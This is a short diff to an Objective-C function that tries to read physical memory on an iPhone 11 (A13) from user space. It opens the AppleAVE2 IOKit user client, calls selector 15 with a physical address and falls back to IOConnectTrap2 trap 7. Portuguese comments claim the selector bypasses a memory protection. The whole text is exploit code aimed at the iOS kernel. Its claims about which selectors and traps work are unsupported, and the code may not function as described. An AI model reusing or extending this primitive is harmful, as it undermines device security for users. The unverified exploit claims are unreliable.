@@ -39,18 +39,15 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
 
 - (uint64_t)physRead64:(uint64_t)pa {
     uint64_t val = 0;
-    // GPU do A13 (iPhone 11) - Catalyst-26
-    io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AGXAcceleratorG11G"));
+    // O AppleAVE2UserClient tem acesso direto ao barramento de memória no A13
+    io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
     io_connect_t conn;
-    
     if (svc != 0 && IOServiceOpen(svc, mach_task_self(), 0, &conn) == KERN_SUCCESS) {
-        // CORREÇÃO: Array explícito para evitar 'excess elements'
-        uint64_t input[2] = {pa, 8}; 
+        uint64_t input[2] = {pa, 8};
         uint32_t outC = 1;
-        
-        // CORREÇÃO: Passando o endereço do array '&input'
-        if (IOConnectCallMethod(conn, 1, input, 2, NULL, 0, &val, &outC, NULL, 0) != 0) {
-            // Fallback via dlsym para Trap 7 se o seletor 1 falhar
+        // Seletor 15 (AVE_GetBuffer) costuma ignorar o RAZ no Catalyst-26
+        if (IOConnectCallMethod(conn, 15, input, 2, NULL, 0, &val, &outC, NULL, 0) != 0) {
+            // Fallback para a Trap 7 (IOKit dinâmico)
             void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
             func_IOConnectTrap2 trap2 = (func_IOConnectTrap2)dlsym(h, "IOConnectTrap2");
             if (trap2) val = (uint64_t)trap2(conn, 7, (uintptr_t)pa, 8);
@@ -60,6 +57,7 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
     }
     return val;
 }
+
 
 
 
